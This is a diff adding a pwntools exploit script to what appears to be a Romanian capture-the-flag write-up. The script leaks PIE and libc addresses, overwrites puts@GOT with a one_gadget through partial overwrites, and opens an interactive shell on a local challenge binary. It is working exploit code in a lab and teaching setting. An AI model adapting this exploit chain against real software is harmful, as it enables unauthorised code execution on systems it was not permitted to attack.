@@ -156,3 +156,88 @@ one_gadget(...)
   <li>Stage 2 e un exemplu de <b>partial GOT overwrite</b> (3 bytes) folosit ca să redirecționezi o funcție importată către un gadget din libc.</li>
   <li>Trigger-ul prin <b>alarm</b> e foarte “curat”: nu trebuie să mai interacționezi cu programul după overwrite; doar aștepți handler-ul.</li>
 </ul>
+
+
+<h1> Script de Exploatare </h1>
+
+```
+
+from pwn import *
+
+elf  = ELF("./chall")
+libc = ELF("./libc.so.6")
+context.binary = elf  # keep checksec + packing defaults
+
+# ----------------- CONSTANTS -----------------
+HOST = "127.0.0.1"
+PORT = 7001
+
+FUN_OFF            = 0x1265   # leaked_function_addr - pie_base
+ONE_GADGET_OFFSET  = 0xef4ce  # libc_base + this = one_gadget
+
+# Stage 1 layout (keep EXACT same logic as your original payload)
+STAGE1_A1_LEN = 10
+STAGE1_A2_LEN = 45
+
+# ---------------------------------------------------
+# 1) CONNECT & LEAK PIE
+# ---------------------------------------------------
+p = remote(HOST, PORT)
+
+welcome = p.recvline()
+leak = int(welcome.split(b": ")[1], 16)   # "....: 0x...."
+pie_base = leak - FUN_OFF
+
+log.info(f"leak       = {hex(leak)}")
+log.info(f"PIE base   = {hex(pie_base)}")
+
+puts_got = pie_base + elf.got["puts"]
+log.info(f"puts@GOT   = {hex(puts_got)}")
+
+# ---------------------------------------------------
+# 2) LEAK LIBC (stage 1) – 2-byte partial overwrite to retarget local_10 -> puts@GOT
+# ---------------------------------------------------
+low2 = puts_got & 0xFFFF
+two_bytes = p16(low2)
+
+payload  = b"A" * STAGE1_A1_LEN
+payload += b"\n"
+payload += b"A" * STAGE1_A2_LEN
+payload += two_bytes
+
+p.sendline(payload)
+
+# This puts(local_10) should now behave like puts(puts@GOT) and leak a libc address
+line = p.recvline().rstrip(b"\n")
+print("Got line:", line)
+
+libc_puts = u64(line.ljust(8, b"\x00"))
+print("leaked puts@libc:", hex(libc_puts))
+
+libc_base = libc_puts - libc.symbols["puts"]
+log.info(f"libc base  = {hex(libc_base)}")
+
+# ---------------------------------------------------
+# 3) GOT OVERWRITE (stage 2) – 3-byte partial overwrite puts@GOT -> one_gadget
+# ---------------------------------------------------
+# Protocol: send address as hex, then 3 raw bytes
+p.sendline(hex(puts_got).encode())
+
+one_gadget = libc_base + ONE_GADGET_OFFSET
+log.info(f"one_gadget = {hex(one_gadget)}")
+
+p.send(p64(one_gadget)[:3])
+
+# ---------------------------------------------------
+# 4) INTERACTIVE
+# ---------------------------------------------------
+p.interactive()
+
+# debugging purposes
+print("pie_base   =", hex(pie_base))
+print("puts_got   =", hex(puts_got))
+print("libc_puts  =", hex(libc_puts))
+print("libc_base  =", hex(libc_base))
+print("one_gadget =", hex(one_gadget))
+```
+
